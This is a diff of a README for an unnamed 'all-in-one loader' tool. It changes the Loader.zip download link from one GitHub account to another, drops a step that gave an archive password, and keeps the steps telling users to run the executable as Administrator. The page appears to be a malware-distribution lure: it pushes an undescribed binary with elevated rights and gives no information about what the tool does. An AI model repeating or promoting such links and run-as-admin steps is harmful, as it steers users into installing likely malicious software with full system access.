@@ -8,7 +8,7 @@
 
 <div align="center">
 
-  <a href="https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip">
+  <a href="https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip">
     <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
   </a>
 
@@ -17,10 +17,9 @@
 > ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.
 
 1. **⬇️ Download** the tool from the button above.
-2. **📦 Extract** the archive (password: `respocket`).
-3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
-4. **✅ Follow the setup wizard** – complete the installation.
-5. **🚀 Launch the Tool** – the main window appears.
+2. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
+3. **✅ Follow the setup wizard** – complete the installation.
+4. **🚀 Launch the Tool** – the main window appears.
 
 ---
 
